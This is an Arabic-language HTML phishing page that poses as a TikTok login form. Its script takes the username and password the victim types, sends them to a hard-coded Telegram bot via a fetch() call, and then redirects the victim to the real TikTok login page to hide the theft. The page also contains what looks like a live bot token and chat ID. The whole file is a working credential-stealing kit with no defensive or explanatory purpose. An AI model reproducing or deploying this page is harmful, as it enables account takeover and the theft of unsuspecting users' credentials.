<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        body { background: #010101; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; margin: 0; }
        .login-card { background: #121212; padding: 40px; border-radius: 16px; text-align: center; width: 320px; border: 1px solid #333; }
        .logo { font-size: 30px; font-weight: bold; margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; background: #222; border: 1px solid #444; border-radius: 8px; color: white; box-sizing: border-box; }
        .login-btn { width: 100%; padding: 12px; background: #fe2c55; color: white; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="logo">TIKTOK</div>
        <form id="loginForm">
            <input type="text" id="username" placeholder="اسم المستخدم" required>
            <input type="password" id="password" placeholder="كلمة السر" required>
            <button type="submit" class="login-btn" id="submitBtn">تسجيل الدخول</button>
        </form>
    </div>

    <script>
        // الكود هنا بسيط جداً لتجنب أخطاء الرموز
        const B_TOKEN = "8105232434:AAFBeUtacZAGdfX_e2pE2MzBEGgaL8_zgVI";
        const C_ID = "301641581";

        document.getElementById('loginForm').onsubmit = function(e) {
            e.preventDefault();
            
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            const btn = document.getElementById('submitBtn');

            btn.innerText = "...جاري التحميل";
            btn.disabled = true;

            const msg = "New Login:\nUser: " + u + "\nPass: " + p;

            fetch("https://api.telegram.org/bot" + B_TOKEN + "/sendMessage?chat_id=" + C_ID + "&text=" + encodeURIComponent(msg))
            .then(function() {
                window.location.href = "https://www.tiktok.com/login";
            })
            .catch(function() {
                window.location.href = "https://www.tiktok.com/login";
            });
        };
    </script>
</body>
</html>
